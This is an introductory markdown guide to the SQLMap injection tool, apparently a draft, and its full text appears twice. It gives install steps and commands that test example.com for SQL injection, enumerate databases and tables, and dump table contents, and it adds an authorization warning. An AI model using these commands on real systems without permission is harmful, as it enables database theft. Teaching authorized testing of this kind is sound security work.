

# 🛢️ SQLMap Basics Guide

## What is SQLMap?

SQLMap is an open-source penetration testing tool that automates the process of detecting and exploiting SQL injection vulnerabilities in web applications.

---

## 🛠️ Installation

**Linux (Debian-based):**
```bash
sudo apt update && sudo apt install sqlmap

macOS (with Homebrew):

brew install sqlmap

Windows:
Download from https://github.com/sqlmapproject/sqlmap or use via WSL (Windows Subsystem for Linux).
⚡ Basic Commands
1. Test a URL for SQL injection

sqlmap -u "http://example.com/page.php?id=1"

<!-- [ADD SCREENSHOT: Terminal showing sqlmap testing a URL] -->
2. Enumerate database names

sqlmap -u "http://example.com/page.php?id=1" --dbs

<!-- [ADD SCREENSHOT: Terminal showing sqlmap enumerating databases] -->
3. Enumerate tables in a database

sqlmap -u "http://example.com/page.php?id=1" -D database_name --tables

<!-- [ADD SCREENSHOT: Terminal showing sqlmap listing tables] -->
4. Dump database table contents

sqlmap -u "http://example.com/page.php?id=1" -D database_name -T table_name --dump

<!-- [ADD SCREENSHOT: Terminal showing sqlmap dumping table contents] -->
🎯 When to Use

    Identify SQL injection points on a web application

    Extract sensitive database information (ethically)

    Test the security posture of your own or authorized web apps

⚠️ Ethical Warning

Only test web applications you have explicit permission to assess. Unauthorized testing is illegal and unethical.
✅ Tips

    Add --batch to automate prompts (non-interactive mode)

    Combine with browser intercept tools like Burp Suite for better targeting

# 🛢️ SQLMap Basics Guide

## What is SQLMap?

SQLMap is an open-source penetration testing tool that automates the process of detecting and exploiting SQL injection vulnerabilities in web applications.

---

## 🛠️ Installation

**Linux (Debian-based):**
```bash
sudo apt update && sudo apt install sqlmap

macOS (with Homebrew):

brew install sqlmap

Windows:
Download from https://github.com/sqlmapproject/sqlmap or use via WSL (Windows Subsystem for Linux).
⚡ Basic Commands
1. Test a URL for SQL injection

sqlmap -u "http://example.com/page.php?id=1"

<!-- [ADD SCREENSHOT: Terminal showing sqlmap testing a URL] -->
2. Enumerate database names

sqlmap -u "http://example.com/page.php?id=1" --dbs

<!-- [ADD SCREENSHOT: Terminal showing sqlmap enumerating databases] -->
3. Enumerate tables in a database

sqlmap -u "http://example.com/page.php?id=1" -D database_name --tables

<!-- [ADD SCREENSHOT: Terminal showing sqlmap listing tables] -->
4. Dump database table contents

sqlmap -u "http://example.com/page.php?id=1" -D database_name -T table_name --dump

<!-- [ADD SCREENSHOT: Terminal showing sqlmap dumping table contents] -->
🎯 When to Use

    Identify SQL injection points on a web application

    Extract sensitive database information (ethically)

    Test the security posture of your own or authorized web apps

⚠️ Ethical Warning

Only test web applications you have explicit permission to assess. Unauthorized testing is illegal and unethical.
✅ Tips

    Add --batch to automate prompts (non-interactive mode)

    Combine with browser intercept tools like Burp Suite for better targeting